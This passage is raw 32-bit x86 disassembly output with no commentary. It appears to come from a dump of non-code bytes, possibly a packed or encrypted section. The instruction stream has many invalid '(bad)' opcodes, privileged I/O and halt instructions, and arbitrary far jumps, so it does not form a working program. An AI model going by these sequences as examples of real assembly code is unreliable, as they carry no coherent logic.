  4217db:	adc    ecx,DWORD PTR [eax+ebp*2+0x61]
  4217df:	(bad)  
  4217e0:	aas    
  4217e1:	into   
  4217e2:	add    BYTE PTR [esi-0x5e],dh
  4217e5:	inc    ebx
  4217e6:	(bad)  
  4217e7:	out    0xe9,al
  4217e9:	addr16 test eax,0xc203c4d7
  4217ef:	out    0xec,al
  4217f1:	mov    DWORD PTR [ebp-0x799fe9ba],0x3e69c886
  4217fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217fc:	aam    0x11
  4217fe:	jge    0x421809
  421800:	jp     0x421839
  421802:	cwde   
  421803:	sub    ah,BYTE PTR [esi-0x6374b263]
  421809:	mov    ebp,0x301f7aea
  42180e:	iret   
  42180f:	test   DWORD PTR [ecx],eax
  421811:	sbb    BYTE PTR [ebx+0x54659f23],0xf6
  421818:	repz and bl,BYTE PTR [edi+0x4b]
  42181c:	mov    esp,0x236cfe79
  421821:	out    dx,eax
  421822:	push   0xa6d945e2
  421827:	inc    eax
  421828:	inc    ecx
  421829:	repz sub ebp,eax
  42182c:	xchg   ebp,eax
  42182d:	shl    DWORD PTR [edi+0x2d],cl
  421830:	ds fsubr st(2),st
  421833:	cdq    
  421834:	adc    bh,BYTE PTR [edi+edx*1+0x24]
  421838:	repz mov bl,0xc1
  42183b:	fild   QWORD PTR [ebp+ecx*8-0x6b]
  42183f:	in     eax,0x91
  421841:	call   FWORD PTR [ebx+0x49]
  421844:	jb     0x4218b2
  421846:	push   ds
  421847:	inc    BYTE PTR gs:[ecx-0x43]
  42184b:	imul   esi,DWORD PTR [eax-0x6e5602cf],0xffffffc6
  421852:	or     al,0x58
  421854:	mov    al,0x54
  421856:	loop   0x42187b
  421858:	dec    ebp
  421859:	les    edi,FWORD PTR [edx+eiz*8-0x37f11d30]
  421860:	stos   BYTE PTR es:[edi],al
  421861:	stos   DWORD PTR es:[edi],eax
  421862:	adc    al,0xf4
  421864:	nop
  421865:	fnstenv [edx+eax*1-0x5b]
  421869:	les    edi,FWORD PTR [eax+0x6e]
  42186c:	es dec esi
  42186e:	ret    0x1e17
  421871:	push   0xdafd4cd8
  421876:	jbe    0x42181b
  421878:	int3   
  421879:	sub    edi,esi
  42187b:	test   al,0xc6
  42187d:	push   ebp
  42187e:	out    0x32,al
  421880:	push   esp
  421881:	adc    al,0x77
  421883:	or     DWORD PTR [edx-0x2cc5b385],0xd5b04f34
  42188d:	xchg   BYTE PTR [ecx-0x4a],ah
  421890:	cmp    eax,0x1cf94acf
  421895:	(bad)  
  421897:	adc    ebp,DWORD PTR [edx]
  421899:	mov    bl,0xf3
  42189b:	add    ah,0xe4
  42189e:	shl    ebx,cl
  4218a0:	sbb    DWORD PTR [ebx],edx
  4218a2:	imul   edi,DWORD PTR [esi],0xa5a5f65c
  4218a8:	inc    ebp
  4218a9:	jp     0x42188a
  4218ab:	rcr    dl,1
  4218ad:	push   edx
  4218ae:	scas   eax,DWORD PTR es:[edi]
  4218af:	cs es gs mov esi,0x8e48bf87
  4218b7:	adc    BYTE PTR cs:[eax+0x41f79c5a],bh
  4218be:	in     al,0x54
  4218c0:	xor    eax,0xea97b9cc
  4218c5:	sub    edx,DWORD PTR [esi+ebx*4-0x229ea9f]
  4218cc:	fst    QWORD PTR [esp+ebx*1+0x6b963f0]
  4218d3:	or     ebp,DWORD PTR ds:0x3e5a1982
  4218d9:	sbb    al,0xf9
  4218db:	jo     0x4218af
  4218dd:	cmp    DWORD PTR [ebp+edi*1+0x10],0x45d27579
  4218e5:	jnp    0x421925
  4218e7:	adc    al,bl
  4218e9:	mov    esi,0x3c5c1b4d
  4218ee:	int    0x98
  4218f0:	add    edi,DWORD PTR [eax+0x12f13e30]
  4218f6:	mov    dh,0x7a
  4218f8:	cmp    edx,DWORD PTR gs:[ebx-0x23]
  4218fc:	mov    al,ds:0xac24073a
  421901:	xor    ah,BYTE PTR [edi+ecx*2-0x48]
  421905:	jle    0x4218bb
  421907:	fidivr DWORD PTR [edi+esi*4-0x51]
  42190b:	dec    edi
  42190c:	mov    esp,DWORD PTR [ebx-0xc245640]
  421912:	arpl   si,ax
  421914:	xor    ecx,DWORD PTR [edx]
  421916:	jne    0x4218e1
  421918:	outs   dx,DWORD PTR ds:[esi]
  421919:	call   0x9fffb20
  42191e:	xor    eax,DWORD PTR [ebp+0xef42376]
  421924:	rol    BYTE PTR [ecx-0x20],cl
  421927:	pusha  
  421928:	push   edx
  421929:	out    0xb1,al
  42192b:	je     0x4218fa
  42192d:	(bad)  
  42192e:	mov    al,ds:0x8c6e57d4
  421933:	xchg   edi,eax
  421934:	pop    ebp
  421935:	push   esi
  421936:	pop    edi
  421937:	adc    al,BYTE PTR ds:0x80870dd3
  42193d:	pop    ds
  42193e:	inc    ebp
  42193f:	and    BYTE PTR [eax-0x611ece03],bh
  421945:	or     al,0x1f
  421947:	inc    ebp
  421948:	dec    edx
  421949:	cdq    
  42194a:	or     DWORD PTR ds:0xe652690b,ebx
  421950:	(bad)  
  421951:	nop
  421952:	(bad)  
  421953:	mov    esp,0xbd7576b5
  421958:	dec    ebp
  421959:	mov    esp,0xa4f93879
  42195e:	daa    
  42195f:	test   eax,0xf24fe47b
  421964:	push   eax
  421965:	dec    eax
  421966:	fidiv  DWORD PTR [eax]
  421968:	call   0x7c6a:0x4fe67880
  42196f:	loop   0x421969
  421971:	push   edx
  421972:	mov    al,0x28
  421974:	pop    eax
  421975:	fsub   DWORD PTR [ecx]
  421977:	inc    edx
  421978:	outs   dx,DWORD PTR ds:[esi]
  421979:	mov    al,ds:0x3605e006
  42197e:	xchg   DWORD PTR ds:0x5e93417e,eax
  421984:	pop    ss
  421985:	mov    eax,ds:0x38fdfbb2
  42198a:	jl     0x4219f7
  42198c:	data16 loop 0x4219e8
  42198f:	jmp    0xd332:0x976138c2
  421996:	and    eax,0x8799add8
  42199b:	fwait
  42199c:	sbb    DWORD PTR [esi+0x71],0xee436ac1
  4219a3:	test   eax,0x896cd69a
  4219a8:	ins    DWORD PTR es:[edi],dx
  4219a9:	test   eax,0xd9ec19e8
  4219ae:	ss fdiv st(6),st
  4219b1:	or     edi,DWORD PTR [edx-0x1f35af4d]
  4219b7:	mov    dh,0x74
  4219b9:	mov    dl,BYTE PTR ds:0x15cf946f
  4219bf:	jmp    0x421a12
  4219c1:	out    0x57,al
  4219c3:	inc    ecx
  4219c4:	cmc    
  4219c5:	ss (bad) 
  4219c7:	cmp    eax,0x1e6909d2
  4219cc:	mov    cl,0x9f
  4219ce:	test   eax,0xa3f937fc
  4219d3:	mov    gs,WORD PTR [ecx+0xd24be5e]
  4219d9:	pop    eax
  4219da:	push   ds
  4219db:	addr16 nop
  4219dd:	loopne 0x4219fe
  4219df:	jl     0x421a19
  4219e1:	sbb    BYTE PTR [edi-0x7bf76886],cl
  4219e7:	inc    edx
  4219e8:	adc    BYTE PTR [eax-0x73],bh
  4219eb:	loopne 0x4219d1
  4219ed:	pusha  
  4219ee:	inc    eax
  4219ef:	enter  0xe9af,0xfe
  4219f3:	inc    esp
  4219f4:	icebp  
  4219f5:	hlt    
  4219f6:	test   eax,0xa897f4d9
  4219fb:	(bad)  
  4219fc:	icebp  
  4219fd:	mov    bh,0x46
  4219ff:	les    esi,FWORD PTR [eax]
  421a01:	dec    eax
  421a02:	sar    ebx,0x39
  421a05:	stos   BYTE PTR es:[edi],al
  421a06:	and    dl,bh
  421a08:	int    0xd3
  421a0a:	xchg   BYTE PTR [edi+0x1c],cl
  421a0d:	jo     0x421a13
  421a0f:	cmc    
  421a10:	test   al,0x45
  421a12:	shl    ch,cl
  421a14:	es int 0xfb
  421a17:	xcrypt-ofb (bad)
  421a18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a19:	push   0x4453622e
  421a1e:	test   eax,0x5ac2d3d
  421a23:	into   
  421a24:	adc    al,0xcf
  421a26:	gs pop ebp
  421a28:	adc    BYTE PTR [esi+0x1bc6e0c7],dl
  421a2e:	scas   eax,DWORD PTR es:[edi]
  421a2f:	sub    eax,0xf29be7b3
  421a34:	add    dl,bl
  421a36:	int    0xa4
  421a38:	sbb    edi,ecx
  421a3a:	xor    BYTE PTR [edi-0x5d],cl
  421a3d:	mov    WORD PTR [ebp+edx*2+0x74],cs
  421a41:	imul   ebp,DWORD PTR ds:0x69addce4,0x48
  421a48:	cmc    
  421a49:	aaa    
  421a4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a4b:	test   edx,eax
  421a4d:	cmp    al,0x17
  421a4f:	lds    eax,FWORD PTR [edx-0x64f8f492]
  421a55:	stos   BYTE PTR es:[edi],al
  421a56:	loopne 0x421a99
  421a58:	add    BYTE PTR [esi],dl
  421a5a:	xlat   BYTE PTR ds:[ebx]
  421a5b:	mov    dh,0x0
  421a5d:	outs   dx,BYTE PTR ds:[esi]
  421a5e:	dec    eax
  421a5f:	adc    al,0xb0
  421a61:	lea    ebp,[eax-0x65]
  421a64:	sbb    al,0xc3
  421a66:	push   ebp
  421a67:	jl     0x421a19
  421a69:	ret    
  421a6a:	mov    esi,0x2502e0fe
  421a6f:	or     DWORD PTR [eax+0x10],ecx
  421a72:	cdq    
  421a73:	xor    DWORD PTR [edx-0x22d0637b],0xffffffd8
  421a7a:	mov    dh,0x21
  421a7c:	out    dx,al
  421a7d:	or     BYTE PTR [edi+0x15],dl
  421a80:	not    BYTE PTR [ebp+0x2b]
  421a83:	xchg   edi,eax
  421a84:	je     0x421a99
  421a86:	xchg   edx,eax
  421a87:	lds    esi,FWORD PTR [ebp+0x75aa3296]
  421a8d:	mov    al,ds:0x6a5db3db
  421a92:	jmp    0x4110:0xbf67570a
  421a99:	hlt    
  421a9a:	or     eax,DWORD PTR ds:[ecx+eax*1]
  421a9e:	rcr    DWORD PTR [eax],1
  421aa0:	div    dl
  421aa2:	and    cl,BYTE PTR [ebp+0x7c]
  421aa5:	jle    0x421b04
  421aa7:	arpl   WORD PTR [ebp+0x3cc12ddb],dx
  421aad:	jl     0x421a55
  421aaf:	retf   0xd1f1
  421ab2:	inc    edx
  421ab3:	int    0xb0
  421ab5:	sbb    ebx,DWORD PTR [edi+0x3c]
  421ab8:	cwde   
  421ab9:	loop   0x421a76
  421abb:	cli    
  421abc:	sbb    BYTE PTR ds:0x6878857d,dh
  421ac2:	in     al,0xff
  421ac4:	stc    
  421ac5:	xor    eax,edi
  421ac7:	cs sub eax,0x669d1082
  421acd:	inc    ecx
  421ace:	addr16 dec ecx
  421ad0:	pop    eax
  421ad1:	in     al,0x7d
  421ad3:	out    dx,al
  421ad4:	sbb    eax,0x56a58d4
  421ad9:	cmp    eax,ebp
  421adb:	mov    ch,0xaf
  421add:	or     bh,0x2e
  421ae0:	hlt    
  421ae1:	push   eax
  421ae2:	stc    
  421ae3:	ss aam 0x92
  421ae6:	pop    esp
  421ae7:	xor    al,0xe1
  421ae9:	ins    BYTE PTR es:[edi],dx
  421aea:	push   esi
  421aeb:	jb     0x421a81
  421aed:	aad    0x4
  421aef:	fsubr  QWORD PTR [ecx+eiz*4]
  421af2:	stos   BYTE PTR es:[edi],al
  421af3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421af4:	repnz dec edx
  421af6:	adc    eax,DWORD PTR [ebp-0x450da2ae]
  421afc:	mov    bh,0x99
  421afe:	mov    bl,0xe7
  421b00:	std    
  421b01:	je     0x421af7
  421b03:	cs gs cli 
  421b06:	sub    esi,DWORD PTR [edi+edx*2+0x6f150a0c]
  421b0d:	cmc    
  421b0e:	mov    bl,0x2b
  421b10:	xchg   esi,eax
  421b11:	cmp    bh,bl
  421b13:	mov    WORD PTR [ecx-0x7cba8e3b],gs
  421b19:	pop    esi
  421b1a:	add    dh,BYTE PTR [esp+ebp*2-0x441e2191]
  421b21:	sar    BYTE PTR [ecx-0x30afc348],cl
  421b27:	dec    esp
  421b28:	daa    
  421b29:	aaa    
  421b2a:	push   ds
  421b2b:	(bad)  
  421b2c:	fs dec ebx
  421b2e:	mov    bh,0x6
  421b30:	push   0x8bfa992f
  421b35:	and    ch,BYTE PTR [edx+0x420efeb7]
  421b3b:	out    dx,eax
  421b3c:	lds    ebx,FWORD PTR [esi]
  421b3e:	cmp    al,0x3c
  421b40:	test   al,0x8
  421b42:	test   DWORD PTR [eax+0x148d4edd],eax
  421b48:	(bad)  
  421b49:	sub    ch,BYTE PTR [ecx]
  421b4b:	aam    0xbf
  421b4d:	mov    al,ds:0xcb3365fd
  421b52:	mov    ds:0x23f77b9b,eax
  421b57:	fldenv [esi-0x779da3d9]
  421b5d:	clc    
  421b5e:	xor    esi,edi
  421b60:	(bad)  
  421b61:	mov    eax,0x953a594e
  421b66:	adc    eax,0x4a27f419
  421b6b:	adc    DWORD PTR [ebx],ecx
  421b6d:	(bad)
  421b70:	repnz mov bh,0xe9
  421b73:	dec    ecx
  421b74:	add    eax,DWORD PTR [edi]
  421b76:	rol    DWORD PTR [esi],cl
  421b78:	sbb    dl,BYTE PTR [eax-0x47]
  421b7b:	daa    
  421b7c:	pop    es
  421b7d:	push   esi
  421b7e:	sahf   
  421b7f:	mov    esi,0xee1d9e3d
  421b84:	pop    es
  421b85:	mov    eax,0xf57090c9
  421b8a:	xchg   ecx,eax
  421b8b:	mov    dl,0x3f
  421b8d:	jo     0x421b45
  421b8f:	test   eax,0x27be8fd8
  421b94:	loope  0x421bfd
  421b96:	rcl    DWORD PTR [ecx+0x7],1
  421b99:	dec    ecx
  421b9a:	sub    ecx,ecx
  421b9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b9e:	add    BYTE PTR [eax],al
  421ba0:	add    BYTE PTR [eax],al
  421ba2:	sbb    edi,DWORD PTR [esi-0x25106512]
  421ba8:	jg     0x421b69
  421baa:	call   0x5ced:0xdf770da0
  421bb1:	out    dx,al
  421bb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bb3:	xchg   ebp,eax
  421bb4:	add    DWORD PTR [eax],eax
  421bb6:	hlt    
  421bb7:	add    al,0x0
  421bb9:	add    dh,al
  421bbb:	mov    ss:0x1e90dd4,al
  421bc1:	out    dx,eax
  421bc2:	and    ch,al
  421bc4:	mov    WORD PTR [esi+0x4f648e97],ds
  421bca:	and    DWORD PTR [esi+0x78],edi
  421bcd:	sbb    BYTE PTR [ecx+eax*4-0x25],al
  421bd1:	jmp    0x421bb6
  421bd3:	call   0xb91:0x8248267d
  421bda:	sbb    esi,esp
  421bdc:	dec    edi
  421bdd:	add    BYTE PTR [eax+0x5eedac0e],bh
  421be3:	lds    edx,FWORD PTR ds:0xa590a4a2
  421be9:	mov    esi,0xeafa9f7e
  421bee:	push   ebp
  421bef:	mov    bl,0x48
  421bf1:	clc    
  421bf2:	sbb    ch,BYTE PTR [edx+ecx*4]
  421bf5:	xchg   DWORD PTR [eax+0x10c5d01e],esi
  421bfb:	stos   BYTE PTR es:[edi],al
  421bfc:	mov    eax,gs
  421bfe:	mov    DWORD PTR [esi-0x46645c5e],eax
  421c04:	inc    ecx
  421c05:	or     eax,0x7f58fd4d
  421c0a:	scas   al,BYTE PTR es:[edi]
  421c0b:	cvtpi2ps xmm3,QWORD PTR [edi+0x54]
  421c0f:	es pop edx
  421c11:	add    BYTE PTR [edx],dl
  421c13:	push   ss
  421c14:	out    0x36,eax
  421c16:	sub    BYTE PTR [eax+0x17],bl
  421c19:	or     bl,ch
  421c1b:	mov    WORD PTR ds:0x60104db4,?
  421c21:	fmul   DWORD PTR [ecx-0x53]
  421c24:	mov    esi,edi
  421c26:	push   edi
  421c27:	ss xor eax,0x9cd0757d
  421c2d:	sbb    BYTE PTR [edx+0x1214bbc2],al
  421c33:	frstor [edx-0x385f3b9b]
  421c39:	lahf   
  421c3a:	scas   al,BYTE PTR es:[edi]
  421c3b:	mov    ds:0x63af7a1f,al
  421c40:	ins    DWORD PTR es:[edi],dx
  421c41:	jmp    0x201957a8
  421c46:	or     esi,esi
  421c48:	xchg   esi,eax
  421c49:	or     eax,0x3a324c1d
  421c4e:	repnz sub eax,DWORD PTR gs:[eax+0x24defd7f]
  421c56:	sub    ebp,DWORD PTR [ebx+ebx*8-0x76075888]
  421c5d:	jmp    0xd0e3:0x4a7f519b
  421c64:	add    ecx,edx
  421c66:	adc    edi,eax
  421c68:	and    DWORD PTR [eax+0x60b70b46],edi
  421c6e:	inc    ebx
  421c6f:	je     0x421ce8
  421c71:	adc    eax,0x7c3db583
  421c76:	fcmove st,st(5)
  421c78:	cmp    DWORD PTR [eax],esp
  421c7a:	cli    
  421c7b:	sub    BYTE PTR [ebx+0x1243c50b],dh
  421c81:	xchg   edi,eax
  421c82:	shl    DWORD PTR [edx+ecx*2+0x68d552e8],0x4b
  421c8a:	ret    0xcd31
  421c8d:	or     DWORD PTR [ebx-0x30],ecx
  421c90:	fadd   QWORD PTR [esi+edx*4-0x2b]
  421c94:	cs retf 0x744d
  421c98:	(bad)  
  421c99:	mov    al,0xe6
  421c9b:	(bad)  
  421c9c:	iret   
  421c9d:	add    eax,0x8cf33a99
  421ca2:	add    al,0xce
  421ca4:	(bad)  
  421ca5:	and    DWORD PTR [eax+0x50],edi
  421ca8:	loop   0x421d20
  421caa:	or     al,0x31
  421cac:	jl     0x421c95
  421cae:	mov    bl,0xc1
  421cb0:	lahf   
  421cb1:	add    bl,BYTE PTR [ecx+0x73]
  421cb4:	xor    DWORD PTR [edx+0x2b],esi
  421cb7:	into   
  421cb8:	push   edx
  421cb9:	pop    esp
  421cba:	sub    BYTE PTR [eax],bh
  421cbc:	mov    eax,ds:0xe55c2bd1
  421cc1:	int    0xc8
  421cc3:	sbb    DWORD PTR [ecx+ecx*4-0x26bbe66d],0xffffff83
  421ccb:	(bad)  
  421ccc:	push   DWORD PTR [ebx]
  421cce:	and    al,0xf1
  421cd0:	dec    esi
  421cd1:	mov    dl,0x5d
  421cd3:	jl     0x421d13
  421cd5:	cmp    esp,DWORD PTR [ebp+0xa]
  421cd8:	(bad)  
  421cd9:	std    
  421cda:	dec    esp
  421cdb:	ror    DWORD PTR [edx+0x32],1
  421cde:	into   
  421cdf:	(bad)  
  421ce0:	leave  
  421ce1:	inc    ecx
  421ce2:	call   0xe596ad67
  421ce7:	(bad)  
  421ce8:	ja     0x421cc4
  421cea:	jmp    0xafdc:0x490f5902
  421cf1:	call   0x8161:0xd1b52534
  421cf8:	sbb    esi,esp
  421cfa:	jle    0x421ce8
  421cfc:	bound  ebx,QWORD PTR [ebp-0x55]
  421cff:	or     al,0xdf
  421d01:	loope  0x421d6a
  421d03:	ins    BYTE PTR es:[edi],dx
  421d04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d05:	adc    cl,BYTE PTR [ebp+0x10]
  421d08:	arpl   WORD PTR [edx+0x6d55949f],di
  421d0e:	mov    dh,0x95
  421d10:	inc    eax
  421d11:	push   es
  421d12:	xlat   BYTE PTR ds:[ebx]
  421d13:	into   
  421d14:	(bad)  
  421d15:	jno    0x421ce0
  421d17:	inc    edx
  421d18:	push   esp
  421d19:	push   ss
  421d1a:	fprem  
  421d1c:	inc    esi
  421d1d:	ds ror esi,0xe6
  421d21:	xor    eax,0xcddbfd88
  421d26:	adc    BYTE PTR [edx+0xf],0xc6
  421d2a:	loopne 0x421d58
  421d2c:	jl     0x421ce1
  421d2e:	lods   eax,DWORD PTR ds:[esi]
  421d2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d30:	mov    BYTE PTR [ebp-0x22],0xf
  421d34:	in     al,dx
  421d35:	mov    esi,0x2cb05ce5
  421d3a:	cdq    
  421d3b:	sbb    eax,0xead958a5
  421d40:	int3   
  421d41:	xchg   ecx,eax
  421d42:	mov    cl,0x85
  421d44:	fwait
  421d45:	mov    al,ds:0xc49cb70a
  421d4a:	mov    BYTE PTR [edx-0x15e4b53c],bl
  421d50:	sbb    BYTE PTR ds:0xb8f76c62,ch
  421d56:	retf   0xd3f0
  421d59:	adc    ch,ch
  421d5b:	push   0x311a1249
  421d60:	jge    0x421d47
  421d62:	data16 and ch,cl
  421d65:	cdq    
  421d66:	rcr    BYTE PTR fs:[bx+di],cl
  421d6a:	je     0x421dac
  421d6c:	push   ebx
  421d6d:	xlat   BYTE PTR ds:[ebx]
  421d6e:	inc    ecx
  421d6f:	ret    
  421d70:	xchg   ecx,eax
  421d71:	cli    
  421d72:	push   0xc91db71b
  421d77:	out    0xfb,eax
  421d79:	pop    esp
  421d7a:	cmp    BYTE PTR [ebp-0x23],dl
  421d7d:	test   eax,ebx
  421d7f:	sar    DWORD PTR [esi+0x3fa6b103],1
  421d85:	adc    ecx,edx
  421d87:	js     0x421d90
  421d89:	adc    DWORD PTR [edi],ebp
  421d8b:	or     eax,0xa1bef868
  421d90:	lods   eax,DWORD PTR ds:[esi]
  421d91:	xor    ch,BYTE PTR [esi+0x42]
  421d94:	jg     0x421d37
  421d96:	inc    esi
  421d97:	int    0x3f
  421d99:	mov    ebx,0x2fa5d30e
  421d9e:	in     al,0x86
  421da0:	and    eax,0x1b756c1d
  421da5:	enter  0x64ff,0x69
  421da9:	mov    ds:0x9fcb1ca8,al
  421dae:	xchg   ebx,eax
  421daf:	jmp    0x28fa1fcd
  421db4:	xchg   BYTE PTR [esi-0x9],bh
  421db7:	cmp    eax,0x8c7a79f
  421dbc:	das    
  421dbd:	cmc    
  421dbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dbf:	out    dx,eax
  421dc0:	imul   edi,eax,0x19
  421dc3:	and    BYTE PTR [ebp+0x26eb299a],bh
  421dc9:	stos   BYTE PTR es:[edi],al
  421dca:	mov    bh,0x65
  421dcc:	mov    edi,0xd115e56f
  421dd1:	ja     0x421e1c
  421dd3:	mov    ch,0x13
  421dd5:	mov    ds:0x25ec7d92,eax
  421dda:	test   DWORD PTR [edx-0x6ac0075e],esp
  421de0:	mov    dl,0x43
  421de2:	outs   dx,BYTE PTR ds:[esi]
  421de3:	jge    0x421def
  421de5:	xchg   esp,eax
  421de6:	adc    eax,0x768ca3cb
  421deb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421dec:	pop    ebp
  421ded:	(bad)
  421df1:	sbb    BYTE PTR [edx-0x15dcc99d],bh
  421df7:	xchg   BYTE PTR [esi+0x728569c7],dl
  421dfd:	fidivr DWORD PTR es:[eax+0x3252c73d]
  421e04:	fcomp  QWORD PTR ds:0xcd2e7738
  421e0a:	dec    ebx
  421e0b:	out    dx,eax
  421e0c:	inc    esi
  421e0d:	jmp    0x6c8c:0x699457f2
  421e14:	sub    bl,cl
  421e16:	shl    BYTE PTR [ebp*8-0x5db55a25],1
  421e1d:	hlt    
  421e1e:	rcr    ah,cl
  421e20:	scas   al,BYTE PTR es:[edi]
  421e21:	and    eax,0xcb3f1b80
  421e26:	xor    eax,DWORD PTR [edx-0x35d6a455]
  421e2c:	das    
  421e2d:	(bad)  
  421e2e:	adc    eax,0x3c917e27
  421e33:	lods   eax,DWORD PTR ds:[esi]
  421e34:	xchg   BYTE PTR [edx+esi*8-0x80],bh
  421e38:	pop    edi
  421e39:	pop    ecx
  421e3a:	add    DWORD PTR [ebp-0x7dd7330c],0x111b9f35
  421e44:	mov    dh,0xa2
  421e46:	scas   eax,DWORD PTR es:[edi]
  421e47:	stc    
  421e48:	jg     0x421eb6
  421e4a:	cmp    al,0x43
  421e4c:	cmp    DWORD PTR [edi-0x3d],ecx
  421e4f:	gs dec edi
  421e51:	add    eax,0x17ba05ad
  421e56:	xor    BYTE PTR fs:[esi+0x2676c421],cl
  421e5d:	push   esi
  421e5e:	mov    bh,0xc3
  421e60:	pop    eax
  421e61:	push   esp
  421e62:	int3   
  421e63:	dec    edx
  421e64:	add    ecx,ebx
  421e66:	jmp    0xc3a:0xcda98c58
  421e6d:	(bad)  
  421e6e:	dec    esi
  421e6f:	dec    ebp
  421e70:	gs cld 
  421e72:	lods   al,BYTE PTR ds:[esi]
  421e73:	inc    ebx
  421e74:	pop    esp
  421e75:	fild   DWORD PTR [eax+ebp*8]
  421e78:	dec    esi
  421e79:	(bad)
  421e7c:	cdq    
  421e7d:	cli    
  421e7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e7f:	lea    ebx,[ecx-0x36]
  421e82:	add    ebp,esp
  421e84:	push   ebp
  421e85:	pop    ds
  421e86:	outs   dx,DWORD PTR ds:[esi]
  421e87:	fadd   st(4),st
  421e89:	or     DWORD PTR [edx-0x57],0x12
  421e8d:	mov    ch,0x49
  421e8f:	cmp    al,0xb5
  421e91:	add    dl,al
  421e93:	sub    DWORD PTR [edi],edx
  421e95:	js     0x421e40
  421e97:	inc    ecx
  421e98:	in     eax,0xe1
  421e9a:	pusha  
  421e9b:	push   eax
  421e9c:	sub    ch,BYTE PTR [ebp+0x5d3d3189]
  421ea2:	fld    TBYTE PTR [edi+0x6eed4f79]
  421ea8:	das    
  421ea9:	or     DWORD PTR [ebx-0x3f820784],esp
  421eaf:	cmp    bh,dh
  421eb1:	mul    BYTE PTR [eax]
  421eb3:	or     eax,0x3ff23f0f
  421eb8:	(bad)  
  421eb9:	adc    al,0x38
  421ebb:	jnp    0x421eab
  421ebd:	lock ins DWORD PTR es:[edi],dx
  421ebf:	mov    ds:0xc54f9556,eax
  421ec4:	xor    edi,DWORD PTR [edi+0x4b]
  421ec7:	(bad)  
  421ec8:	hlt    
  421ec9:	add    bh,BYTE PTR [ecx+edi*8-0x55]
  421ecd:	mov    esp,0x1a11fdab
  421ed2:	nop
  421ed3:	add    ecx,DWORD PTR [ecx-0x57]
  421ed6:	addr16 push edi
  421ed8:	shl    BYTE PTR [edx+0x669523d0],cl
  421ede:	cdq    
  421edf:	mov    esp,0xa6305c8c
  421ee4:	aam    0x2
  421ee6:	jecxz  0x421e7c
  421ee8:	(bad)
  421eec:	enter  0x47fd,0x46
  421ef0:	sbb    DWORD PTR [ecx+0x24f4b5d5],ebp
  421ef6:	cli    
  421ef7:	jle    0x421f29
  421ef9:	mov    cl,0x22
  421efb:	inc    ebx
  421efc:	in     eax,dx
  421efd:	jnp    0x421f5e
  421eff:	retf   
  421f00:	pop    eax
  421f01:	and    eax,0x44162471
  421f06:	jno    0x421f0a
  421f08:	ret    
  421f09:	mov    es,esp
  421f0b:	adc    eax,0x7597cd24
  421f10:	cmp    eax,DWORD PTR [ebx+0xb8beb4e]
  421f16:	inc    ecx
  421f17:	pop    ebp
  421f18:	test   eax,ebp
  421f1a:	sbb    ebx,DWORD PTR [ebx]
  421f1c:	sbb    al,0xd2
  421f1e:	in     al,dx
  421f1f:	rcl    BYTE PTR [ecx],cl
  421f21:	outs   dx,BYTE PTR ds:[esi]
  421f22:	cdq    
  421f23:	dec    esi
  421f24:	test   edi,ecx
  421f26:	xchg   esi,eax
  421f27:	pushf  
  421f28:	call   0x5dc9f98
  421f2d:	inc    esp
  421f2e:	push   ebp
  421f2f:	jno    0x421f22
  421f31:	jle    0x421f8d
  421f33:	rcr    DWORD PTR ds:[ebx+0x2],1
  421f37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f38:	bnd jns 0x421f81
  421f3b:	bound  edi,QWORD PTR [eax-0x3c]
  421f3e:	(bad)  
  421f40:	sbb    ah,al
  421f42:	(bad)  
  421f44:	push   0xf1c071e0
  421f49:	nop
  421f4a:	push   esp
  421f4b:	fidivr DWORD PTR [edx-0x19]
  421f4e:	cmp    edi,DWORD PTR [eax+0x16add059]
  421f54:	mov    eax,0x9cf9e10
  421f59:	iret   
  421f5a:	rcl    ecx,1
  421f5c:	pop    esp
  421f5d:	fdivr  QWORD PTR [esi-0x49]
  421f60:	dec    ecx
  421f61:	repnz mov al,0x30
  421f64:	in     al,0xd8
  421f66:	xor    ax,0x66d3
  421f6a:	add    DWORD PTR [eax],eax
  421f6c:	sbb    ecx,DWORD PTR [eax]
  421f6e:	push   esp
  421f6f:	mov    eax,ds:0x800ea7c9
  421f74:	mov    dl,0x77
  421f76:	push   esi
  421f77:	push   cs
  421f78:	and    bh,BYTE PTR [esi-0x2aabda07]
  421f7e:	fbstp  TBYTE PTR [ebx-0x5cf3ec15]
  421f84:	push   edx
  421f85:	retf   0xa665
  421f88:	pop    ecx
  421f89:	adc    BYTE PTR [ecx+0x58],dh
  421f8c:	aaa    
  421f8d:	pop    ebp
  421f8e:	adc    edx,ebx
  421f90:	xchg   ebp,eax
  421f91:	and    eax,0x6443fd68
  421f96:	fs js  0x421f2b
  421f99:	retf   
  421f9a:	hlt    
  421f9b:	mov    ebp,0xd97804f4
  421fa0:	(bad)  
  421fa1:	sti    
  421fa2:	cli    
  421fa3:	or     eax,esp
  421fa5:	pop    ds
  421fa6:	into   
  421fa7:	mov    eax,0x83d28473
  421fac:	xchg   DWORD PTR [eax+0x3],esp
  421faf:	jg     0x421fbc
  421fb1:	mov    al,ds:0xfa6225ec
  421fb6:	mov    ch,0x4
  421fb8:	into   
  421fb9:	imul   eax,edi,0x21
  421fbc:	sbb    cl,BYTE PTR [esi+0x53f39176]
  421fc2:	scas   eax,DWORD PTR es:[edi]
  421fc3:	push   ss
  421fc4:	out    0x90,al
  421fc6:	dec    ecx
  421fc7:	mov    esi,0x2382a063
  421fcc:	stos   DWORD PTR es:[edi],eax
  421fcd:	(bad)  
  421fcf:	stos   DWORD PTR es:[edi],eax
  421fd0:	mov    eax,0x41d05b75
  421fd5:	cmp    dh,0xb7
  421fd8:	xor    BYTE PTR [ecx-0x4585c25b],bh
  421fde:	pop    esi
  421fdf:	dec    ebp
  421fe0:	loope  0x421fb4
  421fe2:	push   ds
  421fe3:	push   ebx
  421fe4:	cld    
  421fe5:	repz inc ebp
